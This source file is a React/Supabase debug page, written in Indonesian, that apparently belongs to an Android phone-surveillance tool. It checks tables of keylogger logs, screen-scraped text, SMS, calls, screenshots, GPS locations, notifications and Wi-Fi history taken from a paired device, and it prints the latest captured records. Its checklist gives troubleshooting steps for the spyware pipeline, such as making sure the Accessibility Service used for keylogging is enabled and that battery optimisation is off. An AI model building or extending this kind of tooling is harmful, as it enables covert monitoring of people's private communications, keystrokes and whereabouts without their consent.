'use client';

import React, { useEffect, useState } from 'react';
import { supabase } from '../../../lib/supabase';
import { RefreshCw, CheckCircle, XCircle, AlertTriangle } from 'lucide-react';

interface TableStatus {
  name: string;
  count: number | null;
  latestRow: any | null;
  error: string | null;
  latestField: string;
}

export default function DebugPage() {
  const [results, setResults] = useState<TableStatus[]>([]);
  const [loading, setLoading] = useState(true);
  const [deviceId, setDeviceId] = useState<string | null>(null);

  const run = async () => {
    setLoading(true);

    // 1. Devices
    const devRes = await supabase.from('devices').select('*').order('created_at', { ascending: false });
    const savedId = typeof window !== 'undefined' ? localStorage.getItem('selected_device_id') : null;
    const device = (devRes.data?.find(d => d.id === savedId) || devRes.data?.[0]) ?? null;
    setDeviceId(device?.id ?? null);

    const tables: { name: string; latestField: string }[] = [
      { name: 'devices',              latestField: 'created_at' },
      { name: 'service_heartbeats',   latestField: 'recorded_at' },
      { name: 'location_logs',        latestField: 'recorded_at' },
      { name: 'notification_logs',    latestField: 'received_at' },
      { name: 'keylogger_logs',       latestField: 'recorded_at' },
      { name: 'screen_scraped_logs',  latestField: 'recorded_at' },
      { name: 'sms_logs',             latestField: 'recorded_at' },
      { name: 'calls',                latestField: 'recorded_at' },
      { name: 'alerts',               latestField: 'created_at' },
      { name: 'screenshots',          latestField: 'captured_at' },
      { name: 'wifi_history_logs',    latestField: 'connected_at' },
      { name: 'installed_apps',       latestField: 'first_seen_at' },
    ];

    const statuses: TableStatus[] = await Promise.all(
      tables.map(async (t) => {
        try {
          // Count
          const countRes = await supabase.from(t.name).select('*', { count: 'exact', head: true });
          // Latest row
          const rowRes = await supabase.from(t.name).select('*').order(t.latestField, { ascending: false }).limit(1);
          return {
            name: t.name,
            count: countRes.count ?? null,
            latestRow: rowRes.data?.[0] ?? null,
            error: countRes.error?.message ?? rowRes.error?.message ?? null,
            latestField: t.latestField,
          };
        } catch (e: any) {
          return { name: t.name, count: null, latestRow: null, error: e.message, latestField: t.latestField };
        }
      })
    );

    setResults(statuses);
    setLoading(false);
  };

  useEffect(() => { run(); }, []);

  const StatusIcon = ({ s }: { s: TableStatus }) => {
    if (s.error) return <XCircle size={18} className="text-red-400 flex-shrink-0" />;
    if ((s.count ?? 0) > 0) return <CheckCircle size={18} className="text-green-400 flex-shrink-0" />;
    return <AlertTriangle size={18} className="text-yellow-400 flex-shrink-0" />;
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold tracking-tight">🔍 Diagnostik Supabase</h1>
          <p className="text-textSecondary mt-1.5 text-sm">Query langsung ke Supabase dari browser untuk validasi pipeline data.</p>
        </div>
        <button onClick={run} disabled={loading}
          className="flex items-center gap-2 px-4 py-2 bg-accentViolet text-white rounded-xl hover:bg-blue-600 transition-colors text-sm font-semibold disabled:opacity-50">
          <RefreshCw size={15} className={loading ? 'animate-spin' : ''} />
          {loading ? 'Mengecek...' : 'Refresh'}
        </button>
      </div>

      {/* Device Info */}
      <div className="bg-cardBg border border-borderDark rounded-2xl p-5">
        <h2 className="text-sm font-bold text-textSecondary uppercase tracking-wider mb-3">Status Device Terdaftar</h2>
        {deviceId ? (
          <div className="flex items-center gap-3">
            <CheckCircle size={18} className="text-green-400" />
            <div>
              <p className="text-sm font-semibold text-textPrimary">Device ditemukan di tabel <code className="text-accentViolet">devices</code></p>
              <p className="text-xs text-textSecondary font-mono mt-0.5">ID: {deviceId}</p>
            </div>
          </div>
        ) : (
          <div className="flex items-center gap-3">
            <XCircle size={18} className="text-red-400" />
            <div>
              <p className="text-sm font-semibold text-red-400">Tabel devices KOSONG — pairing belum berhasil atau data dihapus</p>
              <p className="text-xs text-textSecondary mt-0.5">Pastikan APK sudah dipasang dan proses pairing di HP sudah selesai.</p>
            </div>
          </div>
        )}
      </div>

      {/* Table Status Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        {results.map((s) => (
          <div key={s.name} className={`bg-cardBg border rounded-2xl p-5 space-y-3 ${s.error ? 'border-red-900/40' : (s.count ?? 0) > 0 ? 'border-green-900/30' : 'border-yellow-900/30'}`}>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <StatusIcon s={s} />
                <code className="text-sm font-bold text-textPrimary">{s.name}</code>
              </div>
              <span className={`text-2xl font-bold ${(s.count ?? 0) > 0 ? 'text-green-400' : 'text-yellow-400'}`}>
                {s.count ?? '—'}
              </span>
            </div>

            {s.error && (
              <div className="text-xs text-red-400 bg-red-950/30 border border-red-900/30 rounded-lg p-2.5 font-mono break-all">
                ❌ ERROR: {s.error}
              </div>
            )}

            {s.latestRow && !s.error && (
              <div className="text-xs bg-darkBg/60 border border-borderDark rounded-lg p-2.5">
                <p className="text-textSecondary font-semibold mb-1.5">Baris Terbaru ({s.latestField}):</p>
                <p className="text-accentViolet font-mono">{new Date((s.latestRow[s.latestField] || '')).toLocaleString('id-ID')}</p>
                <pre className="text-textSecondary/70 mt-1.5 text-[10px] leading-relaxed whitespace-pre-wrap break-all overflow-hidden max-h-24">
                  {JSON.stringify(s.latestRow, null, 2).substring(0, 400)}
                </pre>
              </div>
            )}

            {!s.latestRow && !s.error && (
              <p className="text-xs text-yellow-400/80">⚠️ Belum ada data — tabel kosong</p>
            )}
          </div>
        ))}
      </div>

      {/* Pipeline Checklist */}
      <div className="bg-cardBg border border-borderDark rounded-2xl p-5">
        <h2 className="text-sm font-bold text-textSecondary uppercase tracking-wider mb-4">Checklist Pipeline Android → Supabase → Web</h2>
        <div className="space-y-3 text-sm">
          {[
            { label: 'devices ada data', ok: (results.find(r => r.name === 'devices')?.count ?? 0) > 0, fail: 'Pairing belum selesai / devices table kosong. Re-install APK & pair ulang.' },
            { label: 'service_heartbeats terkirim', ok: (results.find(r => r.name === 'service_heartbeats')?.count ?? 0) > 0, fail: 'BackgroundSyncService tidak berjalan. Cek: baterai optimasi dimatikan untuk app ini.' },
            { label: 'location_logs ada data', ok: (results.find(r => r.name === 'location_logs')?.count ?? 0) > 0, fail: 'GPS tidak mengirim data. Cek: izin lokasi + BackgroundSyncService aktif.' },
            { label: 'notification_logs ada data', ok: (results.find(r => r.name === 'notification_logs')?.count ?? 0) > 0, fail: 'Notification Listener Service nonaktif. Cek di Settings → Notifikasi Khusus / App Access.' },
            { label: 'keylogger_logs ada data', ok: (results.find(r => r.name === 'keylogger_logs')?.count ?? 0) > 0, fail: 'PALING SERING: Accessibility Service nonaktif atau salah konfigurasi. Cek di Settings → Aksesibilitas.' },
            { label: 'wifi_history_logs ada data', ok: (results.find(r => r.name === 'wifi_history_logs')?.count ?? 0) > 0, fail: 'HP belum terhubung WiFi saat service jalan.' },
            { label: 'Tidak ada error query', ok: results.every(r => !r.error), fail: 'Ada error Supabase. Cek RLS / anon key / network.' },
          ].map((item) => (
            <div key={item.label} className="flex items-start gap-3">
              {item.ok
                ? <CheckCircle size={16} className="text-green-400 flex-shrink-0 mt-0.5" />
                : <XCircle size={16} className="text-red-400 flex-shrink-0 mt-0.5" />
              }
              <div>
                <span className={`font-semibold ${item.ok ? 'text-green-400' : 'text-red-400'}`}>{item.label}</span>
                {!item.ok && <p className="text-xs text-textSecondary mt-0.5">{item.fail}</p>}
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
